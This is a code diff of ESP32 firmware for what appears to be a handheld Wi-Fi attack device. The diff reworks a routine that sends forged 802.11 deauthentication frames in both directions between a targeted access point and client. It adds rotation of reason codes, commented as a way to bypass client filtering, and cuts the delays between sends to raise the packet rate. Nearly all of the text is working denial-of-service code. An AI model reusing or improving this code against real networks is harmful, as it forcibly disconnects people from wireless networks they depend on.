@@ -16,122 +16,69 @@ static void deauth_task(void *vParameters) {
 
 
 void send_deauth_packets(const uint8_t *ap_mac, const uint8_t *client_mac) {
-
-    // Get attack channel
     int attack_channel = deauth_get_attack_channel();
-
-    ESP_LOGI(TAG, "Sending deauth bursts on channel %d", attack_channel);
-    ESP_LOGI(TAG, "AP: %02X:%02X:%02X:%02X:%02X:%02X",
+    ESP_LOGI(TAG, "Sending deauth on channel %d", attack_channel);
+    ESP_LOGI(TAG, "AP:     %02X:%02X:%02X:%02X:%02X:%02X",
              ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
     ESP_LOGI(TAG, "Client: %02X:%02X:%02X:%02X:%02X:%02X",
              client_mac[0], client_mac[1], client_mac[2],
              client_mac[3], client_mac[4], client_mac[5]);
 
-    // Prepare WiFi for injection
     prepare_for_injection();
 
-    // Timer
     unsigned long start = esp_timer_get_time() / 1000000;
-
-    // Variables for deauth attack
     uint8_t packet[26];
-    esp_err_t ret;
-    int total_count = 0;
+    int total_count   = 0;
     int success_count = 0;
-    int retry_count = 0;
     const int MAX_RETRIES = 3;
-    
-    while (deauthActive) {
-        // Send burst of 3 packets with retries on failure
-        for (int burst = 0; burst < 3; burst++) {
-            // ===== AP -> Client deauth =====
-            memcpy(packet, deauth_frame, sizeof(deauth_frame));
-            memcpy(&packet[4], client_mac, 6); // Destination: CLIENT
-            memcpy(&packet[10], ap_mac, 6); // Source: AP
-            memcpy(&packet[16], ap_mac, 6); // BSSID: AP
-            
-            retry_count = 0;
-            do {
-                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-                if (ret == ESP_OK) {
-                    success_count++;
-                    break;
-                } else if (ret == ESP_ERR_NO_MEM) {
-                    // TX buffer full, wait for it to drain
-                    vTaskDelay(pdMS_TO_TICKS(50));
-                    retry_count++;
-                } else {
-                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
-                    break;
-                }
-            } while (retry_count < MAX_RETRIES);
-            
-            // Small delay between packets in burst
-            vTaskDelay(pdMS_TO_TICKS(10));
-            
-            // ===== Client -> AP deauth =====
-            memcpy(&packet[4], ap_mac, 6); // Destination: AP
-            memcpy(&packet[10], client_mac, 6); // Source: CLIENT
-            memcpy(&packet[16], ap_mac, 6); // BSSID: AP
-            
-            retry_count = 0;
-            do {
-                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-                if (ret == ESP_OK) {
-                    success_count++;
-                    break;
-                } else if (ret == ESP_ERR_NO_MEM) {
-                    vTaskDelay(pdMS_TO_TICKS(50));
-                    retry_count++;
-                } else {
-                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
-                    break;
-                }
-            } while (retry_count < MAX_RETRIES);
-            
-            vTaskDelay(pdMS_TO_TICKS(10));
-        }
-        
-        // Longer delay between bursts to let buffers clear
-        vTaskDelay(pdMS_TO_TICKS(500));
-        
-        // Log progress every 10 bursts
-        if ((total_count + 1) % 10 == 0) {
-            // Timer
-            unsigned long delay = (esp_timer_get_time() / 1000000) - start;
 
-            // Output
+    // Bypass client filtering with different Reason codes
+    const uint8_t reason_codes[] = { 0x01, 0x03, 0x07, 0x08 };
+    const int reason_count = sizeof(reason_codes);
+
+    while (deauthActive) {
+        for (int burst = 0; burst < 3; burst++) {
+            uint8_t reason = reason_codes[(total_count + burst) % reason_count];
+
+            // ===== AP -> Client =====
+            build_deauth_packet(packet, client_mac, ap_mac, ap_mac, reason);
+            if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
+            vTaskDelay(pdMS_TO_TICKS(5));
+
+            // ===== Client -> AP =====
+            build_deauth_packet(packet, ap_mac, client_mac, ap_mac, reason);
+            if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
+            vTaskDelay(pdMS_TO_TICKS(5));
+        }
+
+        // Inter-burst
+        vTaskDelay(pdMS_TO_TICKS(50));
+
+        if ((total_count + 1) % 10 == 0) {
+            unsigned long elapsed = (esp_timer_get_time() / 1000000) - start;
             char result[256];
-            snprintf(result, sizeof(result), "LOG|DEAUTH|msg=Progress: %d bursts, %d packets sent (delay=%lus)", total_count + 1, success_count, delay);
-            ESP_LOGI(TAG, "Progress: %d bursts, %d packets sent", 
-                     total_count + 1, success_count);
+            snprintf(result, sizeof(result),
+                     "LOG|DEAUTH|msg=Progress: %d bursts, %d packets (elapsed=%lus)",
+                     total_count + 1, success_count, elapsed);
+            ESP_LOGI(TAG, "%s", result);
             BleManager_SendStatus(result);
         }
         total_count++;
     }
 
-    // Handle attackInProgress variable for blinking
     isAttackActive = false;
-    
-    ESP_LOGI(TAG, "Attack complete: %d/%d packets sent successfully", 
-             success_count, total_count * 6);  // 3 bursts × 2 directions
-
-    
-    // Restore original WiFi state
+    ESP_LOGI(TAG, "Attack complete: %d packets sent", success_count);
     vTaskDelay(pdMS_TO_TICKS(200));
     restore_wifi_state();
 }
 
 void start_deauth_attack(char *target, char *ap, int channel) {
-    // Get deauth task handle
-    TaskHandle_t deauth_task_handle = deauth_get_task_handle();
-
     if(deauthActive) {
         ESP_LOGW(TAG, "Deauth already running");
         return;
     }
 
-    if (deauth_task_handle != NULL) {
+    if (deauth_get_task_handle() != NULL) {
         ESP_LOGW(TAG, "Deauth task already exists");
         return;
     }
@@ -161,6 +108,8 @@ void start_deauth_attack(char *target, char *ap, int channel) {
     deauthActive = true;
     isAttackActive = true;
 
+    TaskHandle_t handle = NULL;
+
     // Calling task freeRTOS
     xTaskCreate(
         deauth_task,
@@ -168,16 +117,14 @@ void start_deauth_attack(char *target, char *ap, int channel) {
         4096,
         NULL,
         5,  // Priority less than ble
-        &deauth_task_handle
+        &handle
     );
+    deauth_set_task_handle(handle);
     
     ESP_LOGI(TAG, "Deauth task created");
 }
 
 void stop_deauth_attack() {
-    // Get deauth task handle
-    TaskHandle_t deauth_task_handle = deauth_get_task_handle();
-
     if(!deauthActive) return;
 
     deauthActive = false;
@@ -186,15 +133,16 @@ void stop_deauth_attack() {
     
     // Wait for task to finish (max 2 seconds)
     int wait_count = 0;
-    while (deauth_task_handle != NULL && wait_count < 20) {
+    while (deauth_get_task_handle() != NULL && wait_count < 20) {
         vTaskDelay(pdMS_TO_TICKS(100));
         wait_count++;
     }
     
     // Force delete if still running
-    if (deauth_task_handle != NULL) {
-        vTaskDelete(deauth_task_handle);
-        deauth_task_handle = NULL;
+    TaskHandle_t handle = deauth_get_task_handle();
+    if (handle != NULL) {
+        vTaskDelete(handle);
+        deauth_set_task_handle(NULL);
         restore_wifi_state();
     }
 
